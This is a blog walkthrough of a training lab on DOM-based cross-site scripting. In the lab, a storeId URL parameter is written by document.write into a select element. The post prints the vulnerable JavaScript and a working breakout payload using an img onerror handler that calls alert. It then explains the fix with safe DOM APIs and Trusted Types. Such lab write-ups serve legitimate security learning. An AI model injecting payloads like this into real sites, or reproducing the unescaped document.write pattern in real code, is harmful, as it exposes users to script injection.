+++
draft = false
author = "bloodstiller"
title = "DOM XSS Lab 2: Exploiting document.write with location.search in Select Elements"
keywords = ["DOM XSS", "document.write vulnerability", "location.search exploitation", "cross-site scripting", "JavaScript injection", "select element breakout", "DOM-based XSS", "client-side security", "URL parameter injection", "XSS prevention"] 
tags = ["WebSecurity", "XSS", "DOM", "JavaScript", "document.write", "location.search", "client-side", "injection", "DOM-based", "bug-bounty", "web-exploitation", "OWASP", "security-research"] 
description = "A detailed walkthrough of DOM XSS Lab 2, demonstrating how to exploit document.write sink using location.search source within a select element. Learn about DOM-based cross-site scripting, breaking out of HTML contexts, and client-side JavaScript security vulnerabilities." 
date = 2025-09-29 
toc = true 
bold = true 
next = true 
lastmod = 2025-09-29
+++

## Lab 2: DOM XSS in `document.write` sink using source `location.search` inside a `<select>` element: {#lab-2-dom-xss-in-document-dot-write-sink-using-source-location-dot-search-inside-a-select-element}

> This lab contains a DOM-based cross-site scripting vulnerability in the stock checker. It uses the JavaScript `document.write` function, which writes raw HTML into the page. The function is called with data from `location.search` (the URL query string), which you control. The data is inserted inside a `<select>` element.
>
> To solve this lab, perform a cross-site scripting attack that breaks out of the `<select>` element and calls `alert`.


### Finding an interesting parameter: {#finding-an-interesting-parameter}

-   When we filter for store location, the application uses the query parameter `storeId`.
-   {{< figure src="/ox-hugo/2025-09-29-151741.png" >}}

We should now locate where this parameter is processed in the page’s JavaScript.


### Breaking Down The Source Code: {#breaking-down-the-source-code}

-   Searching the page, we find `storeId` used in the `stockCheckForm` code:
    ![](/ox-hugo/2025-09-29-152034.png)
    ```javascript
     <form id="stockCheckForm" action="/product/stock" method="POST">
       <input required type="hidden" name="productId" value="1">
       <script>
         var stores = ["London","Paris","Milan"];
         var store = (new URLSearchParams(window.location.search)).get('storeId');
         document.write('<select name="storeId">');
         if (store) {
           document.write('<option selected>' + store + '</option>');
         }
         for (var i = 0; i < stores.length; i++) {
           if (stores[i] === store) continue;
           document.write('<option>' + stores[i] + '</option>');
         }
         document.write('</select>');
       </script>
       <button type="submit" class="button">Check stock</button>
    ```


#### Form metadata: {#form-metadata}

```javascript
<form id="stockCheckForm" action="/product/stock" method="POST">
  <input required type="hidden" name="productId" value="1">
```

The form posts to `/product/stock` and includes a hidden `productId=1`.

+Note+: This `productId` is unrelated to the store names; it’s just the product identifier.

The rest of the logic is inside the `<script>` block.


#### Predefined options: {#predefined-options}

```javascript
var stores = ["London","Paris","Milan"];
```

These are the allowed store options shown in the dropdown menu.


#### User-controlled source: {#user-controlled-source}

```javascript
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
```

`URLSearchParams` looks at the page’s query string (that’s `window.location.search`).

`.get('storeId')` pulls out whatever value is set for the `storeId` parameter.

The script then writes that value directly into the page with `document.write`, no escaping or checks, so this means injected HTML/JS can run.


#### Writing to the DOM: {#writing-to-the-dom}

```javascript
if (store) {
  document.write('<option selected>' + store + '</option>');
}
for (var i = 0; i < stores.length; i++) {
  if (stores[i] === store) continue;
  document.write('<option>' + stores[i] + '</option>');
}
document.write('</select>');
```

If `store` has a value, the script writes it into the dropdown as the selected `<option>` using `document.write`.

Next, it adds the built-in stores (`London`, `Paris`, `Milan`) as more `<option>s`, skipping any that `===` match the value of `store`.

Since `store` comes straight from the URL and is written as raw HTML (no encoding), an attacker can inject HTML/JS.


### Exploitation PoC: {#exploitation-poc}

Because `storeId` isn’t sanitized, we can inject our own HTML into the `<select>`.

To prove it’s controllable, first try a harmless value (e.g., `&storeId=bl00dstI113r`).

Result in the DOM (sanity check):
![](/ox-hugo/2025-09-29-155040.png)

Rendered HTML fragment:

```html
<select name="storeId">
  <option selected>bl00dstI113r</option>
  <option>London</option>
  <option>Paris</option>
  <option>Milan</option>
</select>
```

**This is DOM-based XSS because the \*source** is `location.search` (URL input) and the **sink** is `document.write` (HTML output).

The server doesn’t echo our payload. Instead, the browser’s JavaScript takes our URL value and builds the HTML itself, so the attack happens entirely in the DOM.


### Exploitation: triggering an alert {#exploitation-triggering-an-alert}

We need to break out of the `<option>/<select>` context and inject our own element with a JavaScript event, because otherwise the payload stays inside the option’s text, gets treated as plain text (not HTML), and no event handlers or scripts will execute.

The selected option is built as:

-   `'<option selected>' + store + '</option>'`

If we supply a payload that **closes** the current tags and then adds an element with an event handler, we can execute JavaScript.

**Steps**:

1.  Close the current text context by passing a double quote and angle bracket: `">`
2.  Close the `<select>`: `"></select>`
3.  Inject an element with an event handler. A classic is an image that triggers on error: `<img src=1 onerror=alert(1)>`
    -   This works as we are calling an image which does not exist and in the event of an error (which will happen) we will `alert` to the page.
4.  Combined payload:
    `"></select><img src=1 onerror=alert(1)>`
5.  URL-encode spaces if needed (`%20`) →
    `"></select><img%20src=1%20onerror=alert(1)>`

Final PoC (as `storeId`):

-   `storeId="></select><img%20src=1%20onerror=alert(1)>`

Result:
![](/ox-hugo/2025-09-29-162338.png)
![](/ox-hugo/2025-09-29-162430.png)

Injected HTML (simplified view):

```html
<select name="storeId">
  <option selected>"></option>
</select>
<img src="1" onerror="alert(1)">
<option>London</option>
<option>Paris</option>
<option>Milan</option>
<button type="submit" class="button">Check stock</button>
```


### Why This Is Vulnerable: {#why-this-is-vulnerable}

**Primary Issue**: Untrusted data from `location.search` (`storeId` parameter) is inserted into HTML using `document.write` (`store` variable) without encoding.

**How To Fix**:
Don’t use `document.write` for dynamic content. Instead use safer DOM APIs (`createElement`, `textContent`, `appendChild`).

If `document.write` must be used see [mozilla's advisory](https://developer.mozilla.org/en-US/docs/Web/API/Document/write#security_considerations) below. However it is advised to not use it. I would also recommend reading [OWASP DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#dom-based-xss-prevention-cheat-sheet)

> The method is a possible vector for Cross-site-scripting (XSS) attacks, where potentially unsafe strings provided by a user are injected into the DOM without first being sanitized. While the method may block `<script>` elements from executing when they are injected in some browsers (see [Intervening against document.write() for Chrome)](https://developer.chrome.com/blog/removing-document-write/), it is susceptible to many other ways that attackers can craft HTML to run malicious JavaScript.
>
> You can mitigate these issues by always passing [TrustedHTML](https://developer.mozilla.org/en-US/docs/Web/API/TrustedHTML) objects instead of strings, and [enforcing trusted type](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) using the [require-trusted-types-for](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for) CSP directive. This ensures that the input is passed through a transformation function, which has the chance to [sanitize](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS#sanitization) the input to remove potentially dangerous markup (such as [&lt;script&gt;](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/script) elements and event handler attributes), before it is injected.


